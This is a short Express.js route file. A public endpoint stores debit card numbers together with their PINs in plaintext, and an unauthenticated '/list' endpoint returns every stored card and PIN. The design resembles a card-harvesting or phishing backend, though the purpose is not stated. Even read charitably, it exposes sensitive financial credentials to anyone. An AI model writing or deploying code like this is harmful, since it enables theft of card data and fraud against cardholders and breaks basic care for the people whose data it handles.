const express = require("express");
const router = express.Router();
const DebitCardUser = require("../models/DebitCardUser");

// @route   POST /api/debit-cards
// @desc    Save debit card number and PIN
// @access  Public
router.post("/", async (req, res) => {
  const { cardNumber, pin } = req.body;

  if (!cardNumber || !pin) {
    return res.status(400).json({ error: "Card number and PIN are required" });
  }

  try {
    const newDebitCard = new DebitCardUser({ cardNumber, pin });
    await newDebitCard.save();
    res.status(201).json({ message: "Debit card saved successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error, please try again later" });
  }
});

router.get("/list", async (req, res) => {
  try {
    const cards = await DebitCardUser.find().sort({ createdAt: -1 });
    res.status(200).json(cards);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to fetch debit cards" });
  }
});


module.exports = router;
